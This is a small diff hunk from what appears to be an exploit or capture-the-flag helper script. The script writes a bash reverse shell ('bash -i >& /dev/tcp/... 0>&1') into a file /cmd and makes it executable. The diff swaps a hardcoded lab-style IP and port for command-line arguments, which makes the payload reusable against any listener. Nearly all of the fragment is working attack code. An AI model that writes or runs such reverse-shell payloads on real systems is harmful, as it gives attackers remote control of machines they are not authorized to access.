@@ -18,7 +18,7 @@ chmod a+x /cmd
 echo '#!/bin/bash' > /cmd
 
 #change IP and Port
-echo "bash -i >& /dev/tcp/10.10.14.19/1234 0>&1" >> /cmd
+echo "bash -i >& /dev/tcp/$1/$2 0>&1" >> /cmd
 chmod a+x /cmd
 
 
